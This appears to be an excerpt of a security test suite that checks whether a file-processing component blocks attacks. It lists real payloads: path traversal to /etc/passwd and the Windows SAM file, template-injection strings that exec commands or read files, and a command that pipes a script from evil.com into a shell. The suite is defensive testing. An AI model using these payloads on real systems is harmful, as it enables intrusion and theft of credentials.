...
describe("Advanced Attack Simulation Suite", () => {
  ...
  afterEach(async () => {
    ...
    console.log(`Attacks Blocked: ${blocked.length} (${Math.round(blocked.length/attackResults.length*100)}%)`);
  ...
  describe("Path Traversal Attack Vectors", () => {
    const advancedTraversalAttacks = [
      ...
      { payload: "..\\..\\..\\windows\\system32\\config\\sam", severity: "CRITICAL" as const },
      
      // URL encoded attacks
      { payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", severity: "HIGH" as const },
      { payload: "%2e%2e\\%2e%2e\\%2e%2e\\windows\\system32", severity: "HIGH" as const },
      
      // Double encoded
      { payload: "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd", severity: "HIGH" as const },
      ...
      { payload: "..\\0\\..\\0\\..\\0\\windows\\system32", severity: "HIGH" as const },
      ...
      { payload: "..\\\\..\\\\..\\\\WiNdOwS\\\\sYsTeM32", severity: "LOW" as const },
    ...
    it("should block advanced path traversal attack vectors", async () => {
      for (const attack of advancedTraversalAttacks) {
        try {
          ...
          expect(result.message).toMatch(/(security|invalid|path|traversal|dangerous)/i);
  ...
  describe("Code Injection Attacks", () => {
    const codeInjectionPayloads = [
      ...
      { payload: "{{constructor.constructor('return process')().exit()}}", severity: "CRITICAL" as const },
      { payload: "{{constructor.constructor('return require')()('fs').readFileSync('/etc/passwd')}}", severity: "CRITICAL" as const },
      { payload: "{%set x=constructor.constructor('return process')()%}{{x.exit()}}", severity: "CRITICAL" as const },
      
      // Server-Side Template Injection
      { payload: "<%=system('id')%>", severity: "CRITICAL" as const },
      { payload: "<%=require('child_process').exec('whoami')%>", severity: "CRITICAL" as const },
      { payload: "${java.lang.Runtime.getRuntime().exec('id')}", severity: "HIGH" as const },
      { payload: "#{7*7}", severity: "MEDIUM" as const },
      
      // Expression Language injection
      { payload: "${''.class.forName('java.lang.Runtime').getRuntime().exec('id')}", severity: "CRITICAL" as const },
      { payload: "{{7*'7'}}", severity: "MEDIUM" as const },
      { payload: "{{config.items()}}", severity: "LOW" as const },
      
      // Python-specific injections
      { payload: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", severity: "CRITICAL" as const },
      { payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", severity: "CRITICAL" as const }
    ];

    it("should prevent server-side template injection", async () => {
      for (const attack of codeInjectionPayloads) {
        try {
          const testFile = path.join(testDir, `injection-test-${Date.now()}.txt`);
          const result = await fileInjector.processFile(
            testFile,
            attack.payload,
            {},
    ...
    it("should prevent memory exhaustion attacks", async () => {
      ...
      for (const attack of memoryAttacks) {
        try {
          ...
          const testFile = path.join(testDir, `memory-attack-${Date.now()}.txt`);
  ...
  describe("File System Attacks", () => {
    ...
    it("should prevent directory traversal via file operations", async () => {
      const directoryTraversalAttacks = [
        { path: path.join("..", "..", "..", "etc", "passwd"), severity: "CRITICAL" as const },
        { path: path.join("..", "..", "windows", "system32", "config", "sam"), severity: "CRITICAL" as const },
  ...
  describe("Command Injection Attacks", () => {
    it("should prevent shell command injection in frontmatter", async () => {
      const commandInjectionAttacks = [
        ...
        { command: "$(curl http://evil.com/script.sh | sh)", severity: "CRITICAL" as const },
      ...
      for (const attack of commandInjectionAttacks) {
        try {
          ...
          const testFile = path.join(testDir, `cmd-injection-${Date.now()}.txt`);
          const result = await fileInjector.processFile(
            testFile,
            "test content",
            frontmatter,
  ...
  describe("Input Validation Bypass Attempts", () => {
    it("should prevent validation bypass through encoding", async () => {
      const encodingBypassAttacks = [
        ...
        { payload: Buffer.from("../../../etc/passwd").toString('base64'), encoding: "base64", severity: "HIGH" as const },
        { payload: Buffer.from("<script>alert('xss')</script>").toString('base64'), encoding: "base64", severity: "MEDIUM" as const },
        
        // Hex encoded attacks
        { payload: Buffer.from("../../../etc/passwd").toString('hex'), encoding: "hex", severity: "HIGH" as const },
        
        // URL encoded attacks (already covered above but different context)
        { payload: encodeURIComponent("../../../etc/passwd"), encoding: "url", severity: "HIGH" as const }
      ];

      for (const attack of encodingBypassAttacks) {
        try {
          const testFile = path.join(testDir, `encoding-bypass-${Date.now()}.txt`);
          ...
          attackResults.push({
            attack: `Encoding Bypass (${attack.encoding}): ${attack.payload.substring(0, 30)}...`,
